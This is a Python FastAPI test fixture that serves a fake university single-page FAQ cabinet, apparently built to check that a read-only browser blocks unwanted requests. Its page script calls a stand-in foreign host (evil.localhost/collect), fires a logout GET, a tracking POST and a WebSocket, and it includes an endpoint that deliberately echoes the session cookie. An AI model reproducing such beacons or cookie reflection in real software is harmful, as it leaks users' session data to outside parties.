"""A single-page cabinet: the HTML shell is empty, a script draws the FAQ from a Bearer JSON API.

Without JavaScript `/spa-cabinet/faq` is a title and an empty `<div id="app">`. The script takes the
bearer the session left in localStorage, fetches `/spa-cabinet/api/faq` with it and draws the
questions; a refused request sends the page to the login, as a real cabinet does. It also does what
the analytics of a real cabinet do: a POST to its own origin, a fetch to a foreign host and a
WebSocket. None of them may reach a server when the page is opened by the read-only browser.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from fastapi import APIRouter, Request, WebSocket
from fastapi.responses import HTMLResponse, JSONResponse

from tests.fakeuni.login import is_logged_in

router = APIRouter(prefix="/spa-cabinet")

FAQ_TOKEN = "faq-bearer-fixture-DO-NOT-LEAK"
RENEWED = "renewed-cookie-fixture-DO-NOT-LEAK"  # given to the page while it runs; no token shape
STORAGE_KEY = "spa_token"
QUESTIONS = (
    ("Как перенести занятие?", "Подайте заявление в деканат за три дня."),
    ("Где взять справку об обучении?", "В личном кабинете, раздел «Заявки»."),
)


@dataclass
class SpaState:
    faq_reads: int = 0  # answers given to a request with the cookie and the bearer
    refused: int = 0  # requests answered 401
    writes: int = 0  # POSTs that reached the server
    sockets: int = 0  # WebSockets that reached the server
    actions: int = 0  # GETs of an address that names an action (`/logout`)
    shells: int = 0  # times the HTML shell itself was served
    echoed: list[str] = field(default_factory=lambda: list[str]())


STATE = SpaState()


def reset() -> None:
    STATE.faq_reads = STATE.refused = STATE.writes = STATE.sockets = STATE.actions = 0
    STATE.shells = 0
    STATE.echoed.clear()


def _authorized(request: Request) -> bool:
    return is_logged_in(request) and request.headers.get("authorization") == f"Bearer {FAQ_TOKEN}"


def _shell(title: str, script: str) -> HTMLResponse:
    STATE.shells += 1
    return HTMLResponse(
        f"<!doctype html><html><head><title>{title}</title></head><body>"
        f'<div id="app"></div><script>{script}</script></body></html>'
    )


_DRAW = """
const app = document.getElementById('app');
const token = localStorage.getItem('__KEY__') || '';
fetch('/spa-cabinet/api/faq', {headers: {Authorization: 'Bearer ' + token}}).then((r) => {
  if (r.status === 401) { location.assign('/auth/login'); return null; }
  return r.json();
}).then((j) => {
  if (!j) return;
  app.innerHTML = '<h1>Частые вопросы</h1>' + j.items.map((i) =>
    '<section><h2>' + i.question + '</h2><p>' + i.answer + '</p></section>').join('');
  fetch('/spa-cabinet/api/echo', {headers: {Authorization: 'Bearer ' + token}})
    .then((r) => r.json()).then((e) => {
      app.insertAdjacentHTML('beforeend', '<p id="echo">Заметка: ' + e.note + '</p>');
      app.insertAdjacentHTML('beforeend', '<p id="jar">Куки: ' + document.cookie + '</p>');
    });
});
fetch('/spa-cabinet/api/logout').catch(() => {});
fetch('/spa-cabinet/api/track', {method: 'POST', body: '{}'}).catch(() => {});
fetch('https://evil.localhost/collect?c=1').then(
  () => document.title += ' [foreign sent]',
  () => document.title += ' [foreign blocked]');
try { new WebSocket('wss://fakeuni.test/spa-cabinet/socket'); } catch (e) {}
""".replace("__KEY__", STORAGE_KEY)


@router.get("/faq", response_class=HTMLResponse)
async def faq_shell() -> HTMLResponse:
    """Public, like the shell of a real application: the data is behind the API."""
    return _shell("SmartPoint — Частые вопросы", _DRAW)


_HASH = """
const app = document.getElementById('app');
const token = localStorage.getItem('__KEY__') || '';
const nav = '<nav><a href="#/faq">Вопросы</a> <a href="#/requests">Заявки</a> ' +
  '<a href="#/logout">Выйти</a></nav>';
const route = location.hash.slice(1) || '/';
if (route === '/faq') {
  fetch('/spa-cabinet/api/faq', {headers: {Authorization: 'Bearer ' + token}})
    .then((r) => r.json()).then((j) => {
      app.innerHTML = nav + '<h1>Частые вопросы</h1>' + j.items.map((i) =>
        '<section><h2>' + i.question + '</h2><p>' + i.answer + '</p></section>').join('');
    });
} else {
  app.innerHTML = nav + '<h1>Главная</h1><p>Выберите раздел.</p>';
}
""".replace("__KEY__", STORAGE_KEY)


@router.get("/hash", response_class=HTMLResponse)
async def hash_shell() -> HTMLResponse:
    """The same shell for every route: the application reads `#/faq` itself, the server never
    sees the fragment."""
    return _shell("SmartPoint — Кабинет", _HASH)


@router.get("/quiet", response_class=HTMLResponse)
async def quiet_shell() -> HTMLResponse:
    """An application that draws nothing and asks for nothing."""
    return _shell("SmartPoint — Пусто", "window.ready = true;")


@router.get("/api/faq", response_model=None)
async def faq(request: Request) -> JSONResponse:
    if not _authorized(request):
        STATE.refused += 1
        return JSONResponse({"title": "Unauthorized", "status": 401}, status_code=401)
    STATE.faq_reads += 1
    return JSONResponse({"items": [{"question": q, "answer": a} for q, a in QUESTIONS]})


@router.get("/api/echo", response_model=None)
async def echo(request: Request) -> JSONResponse:
    """A neutral field that repeats the cookie of the session, like a careless debug endpoint."""
    if not _authorized(request):
        return JSONResponse({"title": "Unauthorized", "status": 401}, status_code=401)
    cookie = next(iter(request.cookies.values()), "")
    STATE.echoed.append(cookie)
    response = JSONResponse({"note": f"сессия {cookie}"})
    response.set_cookie("renewed", RENEWED, secure=True)  # readable by the page, like a CSRF cookie
    return response


@router.get("/api/logout")
async def logout() -> dict[str, bool]:
    """A GET that does something: a careless site; the read-only browser must not send it."""
    STATE.actions += 1
    return {"ok": True}


@router.post("/api/track")
async def track() -> dict[str, bool]:
    STATE.writes += 1
    return {"ok": True}


@router.websocket("/socket")
async def socket(websocket: WebSocket) -> None:
    STATE.sockets += 1
    await websocket.accept()
    await websocket.close()
